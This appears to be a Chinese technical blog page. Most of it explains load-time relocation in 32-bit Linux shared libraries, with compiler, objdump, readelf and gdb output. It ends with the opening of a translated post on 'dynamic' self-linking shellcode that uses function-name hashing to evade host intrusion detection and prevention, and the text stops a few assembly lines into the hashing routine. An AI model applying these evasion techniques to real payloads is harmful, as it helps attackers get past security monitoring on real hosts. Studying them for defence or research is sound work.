   <span class="number">0xf7fd8565</span> &lt;+<span class="number">25</span>&gt;:    8b <span class="number">45</span> 0c        <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0xc</span>]
   <span class="number">0xf7fd8568</span> &lt;+<span class="number">28</span>&gt;:    <span class="number">01</span> d0   <span class="keyword">add</span>    <span class="literal">eax</span>,<span class="literal">edx</span>
   <span class="number">0xf7fd856a</span> &lt;+<span class="number">30</span>&gt;:    <span class="number">5d</span>      <span class="keyword">pop</span>    <span class="literal">ebp</span>
   <span class="number">0xf7fd856b</span> &lt;+<span class="number">31</span>&gt;:    c3      <span class="keyword">ret</span>    
End of assembler dump.
</code></pre><p>呵，已经替换过了</p>
<p>综上，一切都很明显了，动态链接库ELF文件中有乱七八糟东西如何映射到目的进程的进程空间中去何处的信息，其中就包括有些地址要载入时替换的信息。操作系统负责这件事，在程序载入阶段计算地址，把该换的换掉。</p>
<h3 id="函数调用重定位">函数调用重定位</h3><p>换下<code>ml_main.c</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> myglob = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_util_func</span><span class="params">(<span class="keyword">int</span> a)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = b + ml_util_func(a);</span><br><span class="line">    myglob += c;</span><br><span class="line">    <span class="keyword">return</span> b + myglob;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>ml_util_func</code>被调用,编译</p>
<pre><code> ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -g -c ml_main.c -o ml_mainreloc.o
 ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -shared -o libmlreloc.so ml_mainreloc.o
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">ml_mainreloc</span>.<span class="title">o</span>: <span class="title">warning</span>: <span class="title">relocation</span> <span class="title">against</span> `<span class="title">myglob</span>' <span class="title">in</span> <span class="title">readonly</span> <span class="title">section</span> `.<span class="title">text</span>'.</span>
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">warning</span>: <span class="title">creating</span> <span class="title">a</span> <span class="title">DT_TEXTREL</span> <span class="title">in</span> <span class="title">object</span>.</span>
</code></pre><p>啥玩意：</p>
<pre><code><span class="number">0000057</span>c &lt;ml_util_func&gt;:
 <span class="number">57</span>c:   <span class="number">55</span>                      push   %ebp
 <span class="number">57</span>d:   <span class="number">89</span> e5                   mov    %esp,%ebp
 <span class="number">57f</span>:   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    <span class="number">0x8</span>(%ebp),%eax
 <span class="number">582</span>:   <span class="number">83</span> c0 <span class="number">01</span>                add    $<span class="number">0x1</span>,%eax
 <span class="number">585</span>:   <span class="number">5</span>d                      pop    %ebp
 <span class="number">586</span>:   c3                      ret    

<span class="number">00000587</span> &lt;ml_func&gt;:
 <span class="number">587</span>:   <span class="number">55</span>                      push   %ebp
 <span class="number">588</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp
 <span class="number">58</span>a:   <span class="number">83</span> ec <span class="number">14</span>                sub    $<span class="number">0x14</span>,%esp
 <span class="number">58</span>d:   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    <span class="number">0x8</span>(%ebp),%eax
 <span class="number">590</span>:   <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                mov    %eax,(%esp)
 <span class="number">593</span>:   e8 fc ff ff ff          call   <span class="number">594</span> &lt;ml_func+<span class="number">0xd</span>&gt;
 <span class="number">598</span>:   <span class="number">8</span>b <span class="number">55</span> <span class="number">0</span>c                mov    <span class="number">0xc</span>(%ebp),%edx
 <span class="number">59</span>b:   <span class="number">01</span> d0                   add    %edx,%eax
 <span class="number">59</span>d:   <span class="number">89</span> <span class="number">45</span> fc                mov    %eax,-<span class="number">0x4</span>(%ebp)
 <span class="number">5</span>a0:   <span class="number">8</span>b <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>,%edx
 <span class="number">5</span>a6:   <span class="number">8</span>b <span class="number">45</span> fc                mov    -<span class="number">0x4</span>(%ebp),%eax
 <span class="number">5</span>a9:   <span class="number">01</span> d0                   add    %edx,%eax
 <span class="number">5</span>ab:   a3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    %eax,<span class="number">0x0</span>
 <span class="number">5</span>b0:   <span class="number">8</span>b <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>,%edx
 <span class="number">5</span>b6:   <span class="number">8</span>b <span class="number">45</span> <span class="number">0</span>c                mov    <span class="number">0xc</span>(%ebp),%eax
 <span class="number">5</span>b9:   <span class="number">01</span> d0                   add    %edx,%eax
 <span class="number">5</span>bb:   c9                      leave  
 <span class="number">5</span>bc:   c3                      ret    
 <span class="number">5</span>bd:   <span class="number">66</span> <span class="number">90</span>                   xchg   %ax,%ax
 <span class="number">5</span>bf:   <span class="number">90</span>                      nop
</code></pre><p>注意<code>593</code>那行。</p>
<pre><code><span class="number">593</span>:   e8 fc ff ff ff          call   <span class="number">594</span> &lt;ml_func+<span class="number">0xd</span>&gt;
</code></pre><p><code>call(e8)</code>是相对寻址，<code>fffffffc</code>就是<code>-4</code>，即call指令调用自身(<code>598-4</code>)。</p>
<p>显然，这在载入时要被替换。看看ELF中关于重定位符号映射后偏移信息</p>
<pre><code> ~/Work/project/blackhat/eli  readelf -r libmlreloc.so

Relocation section '.rel.dyn' at offset 0x380 contains 12 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
00001ee8  <span class="number">00000008</span> R_386_RELATIVE   
00001eec  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00002014</span>  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00000594</span>  <span class="number">00000902</span> R_386_PC32        <span class="number">0000057</span>c   ml_util_func
<span class="number">000005a2</span>  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
...
</code></pre><p>当动态链接库载入时，<code>ml_util_func</code>所在的位置对链接器是已知的(基址(0xf7fd8000)+偏移(0x57c))，594这个要替换位置链接器也是已知的。</p>
<p>偏移地址通过<code>R_386_PC32</code>的规则计算就好<code>0x57c-0x597+0xffffffff=0xffffffe4</code></p>
<p>通过gdb会话可以看到是这样：</p>
<pre><code> ~/Work/project/blackhat/eli  gdb -q driver
Reading symbols from /home/lyy/Work/project/blackhat/eli/driver...done.
(gdb)  b driver.c:<span class="number">31</span>
Breakpoint <span class="number">1</span> at <span class="number">0x804874b</span>: file driver.c, line <span class="number">31.</span>
(gdb) r
Starting program: /home/lyy/Work/project/blackhat/eli/driver 
warning: the debug information found in <span class="string">"/usr/lib64/debug/lib64/ld-2.17.so.debug"</span> does not match <span class="string">"/lib/ld-linux.so.2"</span> (CRC mismatch).

name= (<span class="number">10</span> segments) address=(nil)
                 header  <span class="number">0</span>: address= <span class="number">0x8048034</span>
                         type=<span class="number">6</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">1</span>: address= <span class="number">0x8048174</span>
                         type=<span class="number">3</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">2</span>: address= <span class="number">0x8048000</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">3</span>: address= <span class="number">0x8049ef8</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">4</span>: address= <span class="number">0x8049f04</span>
                         type=<span class="number">2</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">5</span>: address= <span class="number">0x8048188</span>
                         type=<span class="number">4</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">6</span>: address= <span class="number">0x8048838</span>
                         type=<span class="number">1685382480</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">7</span>: address=     (nil)
                         type=<span class="number">1685382481</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">8</span>: address= <span class="number">0x8049ef8</span>
                         type=<span class="number">1685382482</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">9</span>: address=     (nil)
                         type=<span class="number">1694766464</span>, flags=<span class="number">0x2800</span>

name=/home/lyy/Work/project/blackhat/eli/libmlreloc.so (<span class="number">7</span> segments) address=<span class="number">0xf7fd8000</span>
                 header  <span class="number">0</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">1</span>: address=<span class="number">0xf7fd9ee8</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">2</span>: address=<span class="number">0xf7fd9ef4</span>
                         type=<span class="number">2</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">3</span>: address=<span class="number">0xf7fd85d4</span>
                         type=<span class="number">1685382480</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">4</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1685382481</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">5</span>: address=<span class="number">0xf7fd9ee8</span>
                         type=<span class="number">1685382482</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">6</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1694766464</span>, flags=<span class="number">0x2800</span>

name=/lib32/libc.so<span class="number">.6</span> (<span class="number">11</span> segments) address=<span class="number">0xf7df4000</span>
                 header  <span class="number">0</span>: address=<span class="number">0xf7df4034</span>
                         type=<span class="number">6</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">1</span>: address=<span class="number">0xf7f67788</span>
                         type=<span class="number">3</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">2</span>: address=<span class="number">0xf7df4000</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">3</span>: address=<span class="number">0xf7f9c1e4</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">4</span>: address=<span class="number">0xf7f9dd9c</span>
                         type=<span class="number">2</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">5</span>: address=<span class="number">0xf7df4194</span>
                         type=<span class="number">4</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">6</span>: address=<span class="number">0xf7f9c1e4</span>
                         type=<span class="number">7</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">7</span>: address=<span class="number">0xf7f677a0</span>
                         type=<span class="number">1685382480</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">8</span>: address=<span class="number">0xf7df4000</span>
                         type=<span class="number">1685382481</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">9</span>: address=<span class="number">0xf7f9c1e4</span>
                         type=<span class="number">1685382482</span>, flags=<span class="number">0x4</span>
                 header <span class="number">10</span>: address=<span class="number">0xf7df4000</span>
                         type=<span class="number">1694766464</span>, flags=<span class="number">0x2800</span>

name=/lib/ld-linux.so<span class="number">.2</span> (<span class="number">7</span> segments) address=<span class="number">0xf7fdc000</span>
                 header  <span class="number">0</span>: address=<span class="number">0xf7fdc000</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">1</span>: address=<span class="number">0xf7ffcc80</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">2</span>: address=<span class="number">0xf7ffcef8</span>
                         type=<span class="number">2</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">3</span>: address=<span class="number">0xf7ff8f00</span>
                         type=<span class="number">1685382480</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">4</span>: address=<span class="number">0xf7fdc000</span>
                         type=<span class="number">1685382481</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">5</span>: address=<span class="number">0xf7ffcc80</span>
                         type=<span class="number">1685382482</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">6</span>: address=<span class="number">0xf7fdc000</span>
                         type=<span class="number">1694766464</span>, flags=<span class="number">0x2800</span>


Breakpoint <span class="number">1</span>, main (argc=<span class="number">1</span>, argv=<span class="number">0xffffcd84</span>) at driver.c:<span class="number">31</span>
<span class="number">31</span>      }
(gdb) disas ml_util_func 
Dump of assembler code <span class="keyword">for</span> function ml_util_func:
   <span class="number">0xf7fd857c</span> &lt;+<span class="number">0</span>&gt;:     push   ebp
   <span class="number">0xf7fd857d</span> &lt;+<span class="number">1</span>&gt;:     mov    ebp,esp
   <span class="number">0xf7fd857f</span> &lt;+<span class="number">3</span>&gt;:     mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>]
   <span class="number">0xf7fd8582</span> &lt;+<span class="number">6</span>&gt;:     add    eax,<span class="number">0x1</span>
   <span class="number">0xf7fd8585</span> &lt;+<span class="number">9</span>&gt;:     pop    ebp
   <span class="number">0xf7fd8586</span> &lt;+<span class="number">10</span>&gt;:    ret    
End of assembler dump.
(gdb) disas /r ml_func
Dump of assembler code <span class="keyword">for</span> function ml_func:
   <span class="number">0xf7fd8587</span> &lt;+<span class="number">0</span>&gt;:     <span class="number">55</span>      push   ebp
   <span class="number">0xf7fd8588</span> &lt;+<span class="number">1</span>&gt;:     <span class="number">89</span> e5   mov    ebp,esp
   <span class="number">0xf7fd858a</span> &lt;+<span class="number">3</span>&gt;:     <span class="number">83</span> ec <span class="number">14</span>        sub    esp,<span class="number">0x14</span>
   <span class="number">0xf7fd858d</span> &lt;+<span class="number">6</span>&gt;:     <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>        mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>]
   <span class="number">0xf7fd8590</span> &lt;+<span class="number">9</span>&gt;:     <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>        mov    DWORD PTR [esp],eax
   <span class="number">0xf7fd8593</span> &lt;+<span class="number">12</span>&gt;:    e8 e4 ff ff ff  call   <span class="number">0xf7fd857c</span> &lt;ml_util_func&gt;
   <span class="number">0xf7fd8598</span> &lt;+<span class="number">17</span>&gt;:    <span class="number">8</span>b <span class="number">55</span> <span class="number">0</span>c        mov    edx,DWORD PTR [ebp+<span class="number">0xc</span>]
   <span class="number">0xf7fd859b</span> &lt;+<span class="number">20</span>&gt;:    <span class="number">01</span> d0   add    eax,edx
   <span class="number">0xf7fd859d</span> &lt;+<span class="number">22</span>&gt;:    <span class="number">89</span> <span class="number">45</span> fc        mov    DWORD PTR [ebp-<span class="number">0x4</span>],eax
   <span class="number">0xf7fd85a0</span> &lt;+<span class="number">25</span>&gt;:    <span class="number">8</span>b <span class="number">15</span> <span class="number">18</span> a0 fd f7       mov    edx,DWORD PTR ds:<span class="number">0xf7fda018</span>
   <span class="number">0xf7fd85a6</span> &lt;+<span class="number">31</span>&gt;:    <span class="number">8</span>b <span class="number">45</span> fc        mov    eax,DWORD PTR [ebp-<span class="number">0x4</span>]
   <span class="number">0xf7fd85a9</span> &lt;+<span class="number">34</span>&gt;:    <span class="number">01</span> d0   add    eax,edx
   <span class="number">0xf7fd85ab</span> &lt;+<span class="number">36</span>&gt;:    a3 <span class="number">18</span> a0 fd f7  mov    ds:<span class="number">0xf7fda018</span>,eax
   <span class="number">0xf7fd85b0</span> &lt;+<span class="number">41</span>&gt;:    <span class="number">8</span>b <span class="number">15</span> <span class="number">18</span> a0 fd f7       mov    edx,DWORD PTR ds:<span class="number">0xf7fda018</span>
   <span class="number">0xf7fd85b6</span> &lt;+<span class="number">47</span>&gt;:    <span class="number">8</span>b <span class="number">45</span> <span class="number">0</span>c        mov    eax,DWORD PTR [ebp+<span class="number">0xc</span>]
   <span class="number">0xf7fd85b9</span> &lt;+<span class="number">50</span>&gt;:    <span class="number">01</span> d0   add    eax,edx
   <span class="number">0xf7fd85bb</span> &lt;+<span class="number">52</span>&gt;:    c9      leave  
   <span class="number">0xf7fd85bc</span> &lt;+<span class="number">53</span>&gt;:    c3      ret    
End of assembler dump.
</code></pre><h2 id="为何需要调用重定向">为何需要调用重定向</h2><p>为什么动态库作为一个整体载入进程时，位置都是确定的，却要经过重定向计算？</p>
<p>简单来说，在声明时对<code>ml_util_func</code>以static关键字声明，把函数作为只模块内可用的话，就不存在重定位了。</p>
<pre><code> ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -g -c ml_main.c -o ml_mainreloc.o      
 ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -shared -o libmlreloc.so ml_mainreloc.o
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">ml_mainreloc</span>.<span class="title">o</span>: <span class="title">warning</span>: <span class="title">relocation</span> <span class="title">against</span> `<span class="title">myglob</span>' <span class="title">in</span> <span class="title">readonly</span> <span class="title">section</span> `.<span class="title">text</span>'.</span>
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">warning</span>: <span class="title">creating</span> <span class="title">a</span> <span class="title">DT_TEXTREL</span> <span class="title">in</span> <span class="title">object</span>.</span>
 ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  objdump -d -<span class="constant">Mintel</span> libmlreloc.so                

libmlreloc.<span class="symbol">so:</span>     file format elf32-i386

<span class="constant">Disassembly</span> <span class="keyword">of</span> section .<span class="symbol">init:</span>

<span class="number">0000054</span>c &lt;ml_util_func&gt;:
 <span class="number">54</span><span class="symbol">c:</span>   <span class="number">55</span>                      push   ebp
 <span class="number">54</span><span class="symbol">d:</span>   <span class="number">89</span> e5                   mov    ebp,esp
 <span class="number">54</span><span class="symbol">f:</span>   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    eax,<span class="constant">DWORD</span> <span class="constant">PTR</span> [ebp+<span class="number">0x8</span>]
 <span class="number">552</span>:   <span class="number">83</span> c0 <span class="number">01</span>                add    eax,<span class="number">0x1</span>
 <span class="number">555</span>:   <span class="number">5</span>d                      pop    ebp
 <span class="number">556</span>:   c3                      ret    

<span class="number">00000557</span> &lt;ml_func&gt;:
 <span class="number">557</span>:   <span class="number">55</span>                      push   ebp
 <span class="number">558</span>:   <span class="number">89</span> e5                   mov    ebp,esp
 <span class="number">55</span><span class="symbol">a:</span>   <span class="number">83</span> ec <span class="number">14</span>                sub    esp,<span class="number">0x14</span>
 <span class="number">55</span><span class="symbol">d:</span>   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    eax,<span class="constant">DWORD</span> <span class="constant">PTR</span> [ebp+<span class="number">0x8</span>]
 <span class="number">560</span>:   <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                mov    <span class="constant">DWORD</span> <span class="constant">PTR</span> [esp],eax
 <span class="number">563</span>:   e8 e4 ff ff ff          call   <span class="number">54</span>c &lt;ml_util_func&gt;
 ...
</code></pre><p>产生这个现象的原因就此一目了然，如果动态库中存在全局变量，也许会被覆盖和改写，其它载入的动态库就不能知道这个变量的相对位置，需要动态重定位。</p>
<h3 id="于可执行文件中引用动态库中的数据">于可执行文件中引用动态库中的数据</h3><p>上例中<code>myglob</code>变量只在动态库内部使用，如果在外部引用呢？这存在一个特殊的重定位过程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> myglob;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"addr myglob = %p\n"</span>, (<span class="keyword">void</span>*)&amp;myglob);</span><br><span class="line">    <span class="keyword">int</span> t = ml_func(argc, argc);</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重新编译运行：</p>
<pre><code> ✘  ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -std=c99 -m32 -g -c driver.c -o driver.o    
 ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -o driver driver.o -<span class="constant">L</span>. -lmlreloc   
 ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  ./driver
addr myglob = <span class="number">0x804a024</span>
</code></pre><p><code>0x804a024</code>显然是在主进程而不是后来载入的动态库虚拟地址区域。而<code>myglob</code>是被赋值的。</p>
<p>从gdb中查看引用<code>myglob</code>的位置：</p>
<pre><code>(gdb) p &amp;myglob
<span class="variable">$1</span> = (&lt;data variable, no debug info&gt; *) <span class="number">0x804a024</span> &lt;myglob&gt;
</code></pre><p>查看elf文件</p>
<pre><code> ✘  ~/Work/project/blackhat/eli  readelf -r driver

Relocation section '.rel.dyn' at offset 0x440 contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  <span class="number">00000406</span> R_386_GLOB_DAT    <span class="number">00000000</span>   __gmon_start__
<span class="number">0804a024</span>  <span class="number">00000805</span> R_386_COPY        <span class="number">0804a024</span>   myglob
</code></pre><p>有个<code>R_386_COPY</code>类型，该类型表示直接把符号复制到<code>Sym.Value</code>的位置。</p>
<p>在<code>.symtab</code>有相应信息告诉我如何把<code>myglob</code>拷贝，包括尺寸<code>4</code></p>
<pre><code>~/Work/project/blackhat/eli  readelf -s libmlreloc.so 

Symbol table <span class="string">'.symtab'</span> <span class="keyword">contains</span> <span class="number">50</span> entries:
   Num:    <span class="keyword">Value</span>  <span class="built_in">Size</span> <span class="keyword">Type</span>    <span class="keyword">Bind</span>   Vis      Ndx <span class="keyword">Name</span>
   ...
    <span class="number">39</span>: <span class="number">00002018</span>     <span class="number">4</span> OBJECT  GLOBAL <span class="keyword">DEFAULT</span>   <span class="number">21</span> myglob
   ...
</code></pre><h2 id="结论">结论</h2><p>载入时重定位是linux下解析载入的内部数据和代码引用的一种方法。PIC是更高级和流行的方式，甚至x86-64已经不支持载入时重定位。</p>
<p>无论如何，希望此文能帮助拨开现代操作系统链接和载入动态库魔法迷雾。</p>
<p>Next, <a href="http://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries/" target="_blank" rel="external">Position Independent Code (PIC) in shared libraries</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2015/03/17/shellcodedynamic/" itemprop="url">
                  Shellcode/Dynamic
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-03-17T00:00:00+08:00" content="2015-03-17">
              2015-03-17
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2015/03/17/shellcodedynamic/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2015/03/17/shellcodedynamic/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>意译：<a href="http://blackhat.life/Dynamic_Shellcode" target="_blank" rel="external">Shellcode/Dynamic</a></p>
<p>动态shellcode是自链接的shellcode，用来规避多种主机层面的防护措施，比如主机入侵检测系统(HIDS)或者主机入侵防护系统(HIPS)。这些措施能阻止传统的null-free shellcode。通过动态shellcode技术，实现比如不包含中断、系统调用或者明文函数字符串等。</p>
<p>[TOC]</p>
<h2 id="评价">评价</h2><p>大多安全设施组件都基于RAM的数据和标记为可执行的内容进行运行时分析。而且，许多系统甚至从内核检查内核中断和系统调用(linux审计工具audit就做这个)。其它也许监视ld-linux中提供给普通应用使用共享库调用的<code>_ld_runtime_resolve</code>的运行，<code>_dl_fixup()</code>的蹦床(trampoline,确定不是函数式编程？？？？)等。当应用尝试执行不在它们<code>.text</code>段的系统调用或中断、或者尝试使用<code>_ld_runtime_resolve</code>，<code>_dl_fixup</code>,<code>dl_open</code>,<code>dl_close</code>或者<code>dl_sym</code>来导入一个不在它导入表(import talbe)的函数时，会触发许多安全系统的警告。另外，使用比如像<code>dl_open()</code>和<code>dl_sym()</code>这样的函数需要使用明文字符串。任何一般的分析都能很容易迅速逆向有效载荷，这是传统null-free shellcode的另一个问题。</p>
<p>一个动态shellcode引擎能够解决这些问题。通过避免C调用惯例使用的寄存器，它可以构建允许开发者写出动态自链接代码的链接器(linker)。于是完全不再需要中断或者系统调用，因为链接器能不倚靠操作系统导入函数。另外，函数哈希被用作阻止函数名通过字符串呈现，解决了上面标准null-free shellcode有的问题。</p>
<h2 id="C调用惯例的影响">C调用惯例的影响</h2><p>通常的系统调用格式或者libc函数调用：</p>
<pre><code>function_call(<span class="decorator">%rax</span>) = <span class="keyword">function</span>(<span class="decorator">%rdi</span>,  <span class="decorator">%rsi</span>,  <span class="decorator">%rdx</span>,  <span class="decorator">%r10</span>,  <span class="decorator">%r8</span>,  <span class="decorator">%r9</span>)
</code></pre><p>返回值通常置于<code>rax</code>中，然而当结构指针被作为参数传递时，在那个参数寄存器中一个指向更改过的结构的指针被返回。</p>
<p>以上陈述显示：写一个链接器时，以下寄存器在没有系统调用的调用之前，不必为函数调用保存。</p>
<pre><code><span class="xml"></span><span class="perl"><span class="variable">%rax</span>, <span class="variable">%rbx</span>, <span class="variable">%rcx</span>, <span class="variable">%rbp</span>, <span class="variable">%r11</span>, <span class="variable">%r12</span>, <span class="variable">%r13</span>, <span class="variable">%r14</span>, <span class="variable">%r15</span></span><span class="xml"></span>
</code></pre><p>大多数寄存器能更改或者被各种libc函数更改，然而<code>rbx</code>在libc中被保留为开发者使用。当写一个动态链接器时，函数参数必须被保留，这样开发者能轻易写出动态集成的代码。最后，链接器取<code>rbx</code>作为库的基址指针，<code>rbp</code>用来哈希函数。这确保了开发者能保持对<code>rax</code>,<code>rdi</code>,<code>rsi</code>,<code>rdx</code>,<code>r10</code>,<code>r8</code>和<code>r9</code>的控制。<code>rcx</code>寄存器被用来作为指向调用函数标签的指针，也许应在函数调用间被保留。</p>
<h2 id="函数哈希">函数哈希</h2><p>这个功能希望<code>rdx</code>是0，<code>rsi</code>中是指向字符串的指针。接着它完成字符串的单向32位哈希并保存在<code>rsi</code>中。</p>
<p>首先，把被哈希程序(hasher)使用的不是<code>rsi</code>的寄存器保留：</p>
<pre><code><span class="label">calc_hash:</span>

<span class="label">preserve_regs:</span>
    <span class="keyword">push</span> rax
    <span class="keyword">push</span> rdx
</code></pre><p><code>rdx</code>作为调用哈希程序的代码的零寄存器(zreg/zero register)。可以指通过简单的<code>push/pop</code>把<code>rax</code>置零来：</p>
<pre><code><span class="label">initialize_regs:</span>
    <span class="keyword">push</span> <span class="literal">rdx</span>
    <span class="keyword">pop</span> <span class="literal">rax</span>
